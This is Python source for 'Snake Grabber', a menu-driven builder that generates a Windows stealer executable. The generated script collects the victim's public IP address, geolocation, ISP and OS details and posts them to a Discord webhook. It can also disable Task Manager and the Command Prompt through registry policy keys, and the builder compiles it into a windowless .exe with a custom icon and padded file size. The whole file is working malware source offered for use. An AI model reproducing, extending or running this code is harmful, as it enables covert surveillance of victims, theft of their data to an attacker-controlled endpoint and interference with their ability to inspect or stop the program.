# Libaries
import os
import shutil
import sys
import ctypes
from time import sleep
from colorama import Fore as Color

class helper: 
    # Banners
    def grabber():
        print(Color.RED + """\n
             ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
            ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
            ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
            ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
            ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
             ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
    """)
    def payload():
        print(Color.RED + """\n
            ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
            ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
            ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
            ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
            ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
            ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
        """)
    def properties():
        print(Color.RED + """\n
            ██████╗ ██████╗  ██████╗ ██████╗ ███████╗██████╗ ████████╗██╗███████╗███████╗
            ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║██╔════╝██╔════╝
            ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  ██████╔╝   ██║   ██║█████╗  ███████╗
            ██╔═══╝ ██╔══██╗██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗   ██║   ██║██╔══╝  ╚════██║
            ██║     ██║  ██║╚██████╔╝██║     ███████╗██║  ██║   ██║   ██║███████╗███████║
            ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝╚══════╝
        """)
    def compile():
        print(Color.RED + """
             ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗██╗     ███████╗
            ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║██║     ██╔════╝
            ██║     ██║   ██║██╔████╔██║██████╔╝██║██║     █████╗  
            ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║██║     ██╔══╝  
            ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║███████╗███████╗
             ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝
        """)

    # Tools
    def validate(filename:str): # Verify if name is allowed to be used for a file/directory
        chars = [   
            "<",
            ">",
            ":",
            "\"",
            "/",
            "\\",
            "|",
            "?",
            "*"
        ]
        names = [
            "con", 
            "prn", 
            "aux", 
            "nul", 
            "com1", 
            "com2", 
            "com3", 
            "com4", 
            "com5", 
            "com6", 
            "com7", 
            "com8", 
            "com9", 
            "lpt1", 
            "lpt2", 
            "lpt3", 
            "lpt4", 
            "lpt5", 
            "lpt6", 
            "lpt7", 
            "lpt8", 
            "lpt9"
        ]
        if any((c in chars) for c in filename.lower()):
            return False
        if any(n in filename.lower() for n in names):
            return False
        else:
            return True
    def create_dump(filename, size_mb): # Create file dump
        size = size_mb * 1048576
        with open(str(filename), 'wb') as fout:
            fout.write(os.urandom(size))
        pass
    def cls():
        os.system("cls")
    def change_console_title(title:str):
        ctypes.windll.kernel32.SetConsoleTitleA(str(title))
        return
class script: # Script settings
    debug = False
    class grabbers:
        # Grab IP Address
        grab_ip = False
        # Grab OS Info
        grab_os = False
    class payloads:
        # Disable Task Manager
        disable_taskmgr = False
        # Disable Command Prompt
        disable_cmd = False
        # Show Message Box
        class message_box:
            show = False
            title = "Title"
            description = "Description"
            type = 1
            # 1 = showinfo
            # 2 = showwarning
            # 3 = showerror
            # 4 = askyesno
            # 4 = askokcancel
            # 5 = askquestion
            # 6 = askretrycancel
            # 7 = askyesnocancel
    class properties:
        name = "script"
        webhook_url = "https://discord.com/api/webhooks/"
        convert2exe = True
        icon = ""
        size = 0
        show_console = False

class builder: # Grabber and payload scripts
    class grabber: # Grabber script builder
        # IP Grabber
        ip = """
def ip():
    import socket, requests, json, sys
    from datetime import datetime
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"}
    hostname = socket.gethostname()
    country = ""
    city = ""
    isp = ""
    zip_code = ""
    x = ""
    y = ""
    try:
        public_ip = requests.get("https://ipapi.co/ip", headers=headers).text
        try:
            ip_request = requests.get(f"http://ip-api.com/json/{public_ip}?fields=1098745")
            if ip_request.status_code == 200:
                ipdata = json.loads(ip_request.text)
                if ipdata["status"] == "success":country = ipdata["country"];city = ipdata["city"];zip_code = ipdata["zip"];x = ipdata["lon"];y = ipdata["lat"];isp = ipdata["isp"]
                elif ipdata["status"] == "fail": pass
            else:
                pass
        except:
            pass
    except requests.ConnectionError:
        return sys.exit()
    embed =  {
        "title": "IP Grabber",
        "description": 
                f"Host name: {hostname}\\n"
                f"IP address: {public_ip}\\n"
                f"Country: {country}\\n"
                f"City: {city}\\n"
                f"Zip: {zip_code}\\n"
                f"ISP: {isp}\\n"
                f"Longitude (X): {x}\\n"
                f"Latitude (Y): {y}\\n",
        "footer": {"text": f"ipaddr@grabber.snake | {datetime.now()}"}
    }
    return embed"""
        # OS Info Grabber
        os = """
def os():
    import platform
    from datetime import datetime
    embed = {
        "title": "OS Grabber",
        "description":
            f"Operating system: {platform.platform()}\\n"
            f"Machine type: {platform.machine()}\\n"
            f"Processor type: {platform.processor()}\\n",
        "footer": {"text": f"os@grabber.snake | {datetime.now()}"}
    }
    return embed"""
        # Minecraft login info grabber

    class payload: # Payload script builder
        # Disable Task Manager (require administrator privilages)
        disable_taskmgr = """\n
def disable_taskmgr():
    import winreg
    if isAdmin():
        winreg.SetValueEx(winreg.OpenKey(winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER), "Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS), "DisableTaskMgr", None, winreg.REG_DWORD, 1)
        tracker.dtmgr_succeed = True
    else:
        tracker.dtmgr_succeed = False
        pass"""
        # Disable Command Prompt (require administrator privilages)
        disable_cmd = """\n
def disable_cmd():
    import winreg
    if isAdmin():
        winreg.SetValueEx(winreg.OpenKey(winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER), "Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_ALL_ACCESS), "DisableCMD", None, winreg.REG_DWORD, 1)
        tracker.dcmd_succeed = True
    else:
        tracker.dcmd_succeed = False
        pass"""
        # Display a message box
        def display_messagebox(notiftype, title, description):
            notiftypeformatted = str(notiftype).replace("1", "showinfo").replace("2", "showwarning").replace("3", "showerror").replace("4", "askyesno").replace("5", "askyesnocancel")
            if title != "__file__":
                title = f"\"{title}\"" 
            elif "__file__" in str(title):
                title = f"f\"{title}\"" 
                title = str(title).replace("__file__", "{__file__}")
            if description != "__file__":
                description = f"\"{description}\""
            elif "__file__" in description:
                description = f"f\"{description}\""
                description = str(description).replace("__file__", "{__file__}")
            script = f"""\n
def messagebox():
    from tkinter import messagebox
    import sys
    m = messagebox.{notiftypeformatted}({title},{description})
    if m:
        return
    else:
        return"""
            return script
        # Display a desktop notification
        # Display a picture
        # Play a video
        # Change desktop wallpaper
        # Write a note on dekstop/current dir
        

def grabber_opt(): # Grabber selector
    if script.debug: 
        helper.change_console_title("Snake Grabber (DEBUG)")
    else: helper.change_console_title("Snake Grabber")
    helper.grabber()
    print(" " * 15 + Color.RED + "[" + Color.GREEN +" Grabber > " + Color.RED + "Payload > Properties > Compile ]\n")
    print(" " * 15 + "-1. Disable all")
    print(" " * 15 + "0. Enable All")
    print(" " * 15 + "1. Grab IP address            : " + str(script.grabbers.grab_ip).replace("True", Color.GREEN + "True" + Color.RED))
    print(" " * 15 + "2. Grab OS info               : " + str(script.grabbers.grab_os).replace("True", Color.GREEN + "True" + Color.RED))
    print(" " * 15 + "99. Next")
    print(" " * 15 + "100. Exit\n")
    option = input("[>] Select option to toggle: ")
    if option == '':
        helper.cls()
        print("[!] Select an option.")
        grabber_opt()
    elif option == 'debug':
        script.debug = not script.debug
        helper.cls()
        grabber_opt()
    elif not option.isnumeric() and not str(option) == "-1":
        helper.cls()
        print("[!] Option is not a number.")
        grabber_opt()
    elif int(option) == -1:
        helper.cls()
        script.grabbers.grab_ip = False
        script.grabbers.grab_os = False
        grabber_opt()
    elif int(option) == 0:
        helper.cls()
        script.grabbers.grab_ip = True
        script.grabbers.grab_os = True
        grabber_opt()
    elif int(option) == 1:
        script.grabbers.grab_ip = not script.grabbers.grab_ip
        helper.cls()
        grabber_opt()
    elif int(option) == 2:
        script.grabbers.grab_os = not script.grabbers.grab_os
        helper.cls()
        grabber_opt()
    elif int(option) == 99:
        helper.cls()
        payload_opt()
    elif int(option) == 100:
        helper.cls()
        print("[i] Exiting...")
        sys.exit()
    else:
        helper.cls()
        print("[!] Invalid option.")
        grabber_opt()

def payload_opt(): # Payload selector
    helper.payload()
    print(" " * 15 + Color.RED + "[" + Color.GREEN +" Grabber > Payload > " + Color.RED + "Properties > Compile ]\n")
    print(" " * 15 + Color.RED + "-1. Disable all")
    print(" " * 15 + Color.RED + "0. Enable All")
    print(" " * 15 + Color.RED + "1. Disable Task Manager*      : " +  str(script.payloads.disable_taskmgr).replace("True", Color.GREEN + "True" + Color.RED))
    print(" " * 15 + Color.RED + "2. Disable Command Prompt*    : " +  str(script.payloads.disable_cmd).replace("True", Color.GREEN + "True" + Color.RED))
    if script.payloads.message_box.show:
        print(" " * 15 + Color.RED + "3. Show Message Box           : " + Color.GREEN + "True")
        print(" " * 18 + Color.RED + "Title                      : " + Color.GREEN + str(script.payloads.message_box.title))
        print(" " * 18 + Color.RED + "Description                : " + Color.GREEN + str(script.payloads.message_box.description))
        print(" " * 18 + Color.RED + "Type                       : " + Color.GREEN + str(script.payloads.message_box.type)
        .replace("1", "1 (Show Info)")
        .replace("2", "2 (Show Warning)")
        .replace("3", "3 (Show Error)")
        .replace("4", "4 (Ask Yes/No)")
        .replace("5", "5 (Ask Yes/No/Cancel)") + Color.RED)
    else:
        print(" " * 15 + "3. Show Message Box           : False")
    print(" " * 15 + "99. Next")
    print(" " * 15 + "100. Return to grabber\n")
    print(" " * 15 + "* : Require admin\n")
    option = input("[>] Select option to toggle: ")
    if option == "":
        helper.cls()
        print("[!] Select an option.")
        payload_opt()
    elif not option.isnumeric() and not str(option) == "-1":
        helper.cls()
        print("[!] Option is not a number")
        payload_opt()
    elif int(option) == -1:
        helper.cls()
        script.payloads.disable_taskmgr = False
        script.payloads.disable_cmd = False
        script.payloads.message_box.show = False
        payload_opt()
    elif int(option) == 0:
        helper.cls()
        script.payloads.disable_taskmgr = True
        script.payloads.disable_cmd = True
        script.payloads.message_box.show = True
        payload_opt()
    elif int(option) == 1:
        script.payloads.disable_taskmgr = not script.payloads.disable_taskmgr
        helper.cls()
        payload_opt()
    elif int(option) == 2:
        script.payloads.disable_cmd = not script.payloads.disable_cmd
        helper.cls()
        payload_opt()
    elif int(option) == 3:
        toggle = input("[>] Toggle (enter/y/n) ")
        if toggle == "":
            script.payloads.message_box.show = not script.payloads.message_box.show
        elif toggle.lower() == "y":
            script.payloads.message_box.show = True
        elif toggle.lower() == "n":
            script.payloads.message_box.show = False
        else: 
            script.payloads.message_box.show = script.payloads.message_box.show
        if script.payloads.message_box.show ==  False:
            helper.cls()
            payload_opt()
        print(Color.RED + "\n[i] Type \"__file__\" to set title/description as file name")
        title = input("[>] Title: ")
        script.payloads.message_box.title = str(title)
        description = input("[>] Description: ")
        script.payloads.message_box.description = str(description)
        print("1. Show Info")
        print("2. Show Warning")
        print("3. Show Error")
        print("4. Ask Yes/No")
        print("5. Ask Yes/No/Cancel")
        type = input("[>] Type: ")
        if type == "":
            helper.cls()
            print("[!] Type cannot be empty")
            payload_opt()
        elif not type.isnumeric():
            helper.cls()
            print("[!] Type is not a number")
            payload_opt()
        elif 0 < int(type) < 6:
            script.payloads.message_box.type = type
            helper.cls()
            payload_opt()
        else:
            helper.cls()
            print("[!] Invalid type.")
            payload_opt()
        script.payloads.message_box.type = type
        script.payloads.message_box.show = not script.payloads.message_box.show
        helper.cls()
        payload_opt()
    elif int(option) == 99:
        helper.cls()
        properties_opt()
    elif int(option) == 100:
        helper.cls()
        grabber_opt()
    else:
        helper.cls()
        print("[!] Invalid option.")
        payload_opt()

def properties_opt(): # Get app info
    helper.properties()
    print(" " * 15 + Color.RED + "[" + Color.GREEN +" Grabber > Payload > Properties" + Color.RED +" > Compile ]\n")
    print(" " * 15 + Color.RED + "1. File name      : " + Color.GREEN + str(script.properties.name) + str(script.properties.convert2exe).replace("True", ".exe").replace("False", ".py"))
    print(" " * 15 + Color.RED + "2. Webhook URL    : " + Color.GREEN + str(script.properties.webhook_url))
    print(" " * 15 + Color.RED + "3. Convert to exe : " + str(script.properties.convert2exe).replace("True", Color.GREEN + "True"))
    if script.properties.convert2exe:
        if script.properties.icon:
            print(" " * 15 + Color.RED + "4. Icon file      : " + Color.GREEN + str(script.properties.icon) + ".ico")
        else:
            print(" " * 15 + Color.RED + "4. Icon file      : None (Default Pyinstaller Icon)")
        print(" " * 15 + Color.RED + "5. Add file size  : " + Color.GREEN + str(script.properties.size).replace("0", Color.RED + "0") + " MB")
        print(" " * 15 + Color.RED + "6. Show console   : " + str(script.properties.show_console).replace("True", Color.GREEN + "True"))
    else:
        print(" " * 15 + Color.RED + "4. Icon file      : [ DISABLED ]")
        print(" " * 15 + Color.RED + "5. Add file size  : [ DISABLED ]")
        print(" " * 15 + Color.RED + "6. Show console   : [ DISABLED ]")
    print(" " * 15 + Color.RED + "99. Compile")
    print(" " * 15 + Color.RED + "100. Return to payloads\n")
    print(" " * 15 + Color.RED + "If add file size is 0, no dump files will be added")
    print(" " * 15 + Color.RED + "If Icon file is empty, it will use the default pyinstaller icon\n")
    option = input("[>] Choose an option to modify: ")
    if option == "":
        helper.cls()
        print("[!] Select an option.")
        properties_opt()
    elif not option.isnumeric():
        helper.cls()
        print("[!] Option is not a number.")
        properties_opt()
    elif int(option) > 3 > 99 and not script.properties.convert2exe:
        helper.cls()
        print("[!] Option is disabled. Enable \"convert to exe\" to enable this option")
        properties_opt()
    elif int(option) == 1:
        name = str(input("[>] File name: "))
        if name == "":
            helper.cls()
            print("[!] Enter a name.")
            properties_opt()
        elif helper.validate(name):
            script.properties.name = name
            helper.cls()
            properties_opt()
        else: 
            helper.cls()
            print("[!] Name is invalid.")
            properties_opt()
    elif int(option) == 2:
        url = input("[>] Webhook URL: ")
        if url == "":
            helper.cls()
            print("[!] Enter a URL")
            properties_opt()
        script.properties.webhook_url = url
        helper.cls()
        properties_opt()
    elif int(option) == 3:
        convert = input("[>] Convert to exe (Y/n) ")
        if convert.lower() == "y" or convert == "":
            script.properties.convert2exe = True
            helper.cls()
            properties_opt()
        else:
            script.properties.convert2exe = False
            helper.cls()
            properties_opt()
    elif int(option) == 4:
        icon = input("[>] Icon file: ")
        script.properties.icon = icon
        helper.cls()
        properties_opt()
    elif int(option) == 5:
        size = input("[>] Add file size: ")
        if size == "":
            helper.cls()
            print("[!] Size cannot be empty!")
            properties_opt()
        elif not size.isnumeric():
            helper.cls()
            print("[!] Size is not a number.")
            properties_opt()
        else:
            script.properties.size = size
            helper.cls()
            properties_opt()
    elif int(option) == 6:
        show = input("[>] Show console (y/N)")
        if show.lower() == "n" or show == "":
            script.properties.show_console = False
            helper.cls()
            properties_opt()
        else:
            script.properties.show_console = True
            helper.cls()
            properties_opt()
    elif int(option) == 99:
        confirm = input("[>] Are you sure all the informations above are all correct? (Y/n) ")
        if confirm.lower() == "y" or confirm == "":
            helper.cls()
            compile()
        else:
            properties_opt()
    elif int(option) == 100:
        helper.cls()
        payload_opt()
    else:
        helper.cls()
        print("[!] Invalid option.")
        properties_opt()

def compile(): # Compile the app
    helper.compile()
    print(" " * 15 + Color.RED + "[" + Color.GREEN +" Grabber > Payload > Properties > Compile" + Color.RED +" ]\n")
    print("\n\n")
    ### Write script ###
    print("[i] Writing script...")
    s = open(script.properties.name + '.py', 'w')
    s.write("")
    s.close()
    with open(script.properties.name + '.py', 'a') as w:
        w.write("class tracker:\n")
        w.write("    isAdmin = False\n")
        if script.payloads.disable_taskmgr:
            w.write("    dtmgr_succeed = False\n")
        if script.payloads.disable_cmd:
            w.write("    dcmd_succeed = False\n\n")
        w.write("def main():\n")
        w.write("    from datetime import datetime\n")
        w.write("    embeds = [\n") # [ Call Grabber
        if script.grabbers.grab_ip:
            w.write("        ip(),\n") # Call IP Grabber
        if script.grabbers.grab_os:
            w.write("        os(),\n") # Call OS Grabber
        w.write("    ]\n") # Call Grabber ]
        w.write("    tracker.isAdmin = isAdmin()\n")
        if script.payloads.disable_taskmgr:
            w.write("    disable_taskmgr()\n") # Call Disable Taskmgr Payload
        if script.payloads.disable_cmd:
            w.write("    disable_cmd()\n") # Call Disable Taskmgr Payload
        if script.payloads.message_box.show:
            w.write("    messagebox()\n")
        w.write("    embeds.append({\n")
        w.write("        \"title\": \"Payloads\",\n")
        w.write("        \"description\": \n")
        description = "            f\"Is admin: {tracker.isAdmin}\\n"
        end = "\",\n"
        if script.payloads.disable_taskmgr:
            description += "Disabled task manager: {tracker.dtmgr_succeed}\\n"
        if script.payloads.disable_cmd:
            description += "Disabled command prompt: {tracker.dcmd_succeed}"
        description += end
        w.write(description)
        w.write("        \"footer\": {\"text\": f\"payloads@payload.snake | {datetime.now()}\"}\n")
        w.write("    })\n")
        w.write("    send_webhook(embeds)\n") # Call webhook
        if script.grabbers.grab_ip: # IP Grabber
            w.write(builder.grabber.ip)
        if script.grabbers.grab_os: # OS Grabber
            w.write(builder.grabber.os)
        if script.payloads.disable_taskmgr: # "Disable Taskmgr" Payload
            w.write(builder.payload.disable_taskmgr)
        if script.payloads.disable_cmd:
            w.write(builder.payload.disable_cmd) # "Disable CMD" Payload
        if script.payloads.message_box.show:
            w.write(builder.payload.display_messagebox(script.payloads.message_box.type, script.payloads.message_box.title, script.payloads.message_box.description))
        w.write("\ndef send_webhook(embeds):\n")
        w.write("    import requests\n")
        w.write("    data = {\"username\": \"s.py\", \"embeds\": embeds}\n")
        w.write(f"    requests.post(url=\"{script.properties.webhook_url}\", json=data)\n")
        w.write("\ndef isAdmin():\n")
        w.write("    import os, ctypes\n")
        w.write("    try:\n")
        w.write("        is_admin = (os.getuid() == 0)\n")
        w.write("    except AttributeError:\n")
        w.write("        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\n")
        w.write("    return is_admin\n")
        w.write("if __name__ == '__main__': main()")
    ### Write script ###

    if script.properties.convert2exe:
        print("[i] Generating conversion command...")
        command = "pyinstaller --onefile "  
        if script.debug: print(Color.YELLOW + "[DEBUG] "  + command + Color.RED)
        if int(script.properties.size) > 0:
            print("[i] Writing dump file...")
            helper.create_dump(str(script.properties.name), int(script.properties.size))
            command += f"--add-data \"{str(script.properties.name)};.\" "
        if script.debug: print(Color.YELLOW + "[DEBUG] "  + command + Color.RED)
        if not script.properties.show_console:
            command += "-w "
        if script.debug: print(Color.YELLOW + "[DEBUG] "  + command + Color.RED)
        if script.properties.icon:
            command += f"-i " + str(script.properties.icon) + ".ico "
        if script.debug: print(Color.YELLOW + "[DEBUG] "  + command + Color.RED)
        command += str(script.properties.name) + ".py"
        if script.debug: print(Color.YELLOW + "[DEBUG] " + command + Color.RED)

        print("[i] Compiling script to executable...\n")
        sleep(5)
        os.system(command)
        input("[>] Press ENTER to delete files and folder created by pyinstaller")
        try:
            print("[i] Moving executable to current directory...")
            os.rename(os.getcwd() + f"\\dist\\{script.properties.name}.exe", os.getcwd() + f"\\{script.properties.name}.exe") # Move exe to current dir
            if int(script.properties.size) > 0:
                print("[i] Deleting dump file...")
                os.remove(f".\\{script.properties.name}") # Delete dump file
            print("[i] Deleting script file...")
            os.remove(f".\\{script.properties.name}.py") # Delete script file
            print("[i] Deleting spec file...")
            os.remove(f".\\{script.properties.name}.spec") # Delte whatever this is file
            print("[i] Deleting build directory")
            shutil.rmtree(".\\build") # Delete "build" dir
            print("[i] Deleting dist directory")
            shutil.rmtree(".\\dist") # Delete "dist" dir
        except shutil.Error as err:
            if script.debug:
                print(err)
                input(Color.YELLOW +  "[DEBUG][SHUTIL] Enter: ")
                helper.cls()
                grabber_opt()
        except os.error as err:
            if script.debug:
                print(err)
                input("[DEBUG][OS] Enter: ")
                helper.cls()
                grabber_opt()
        print(f"[i] Script saved as {script.properties.name}.exe")
        input("[>] Press ENTER to continue...")
        helper.cls()
        grabber_opt()
    else:
        print(f"[i] Script saved as {script.properties.name}.py")
        input("[>] Press ENTER to continue...")
        helper.cls()
        grabber_opt()
    
if __name__ == '__main__':
    helper.cls()
    grabber_opt()
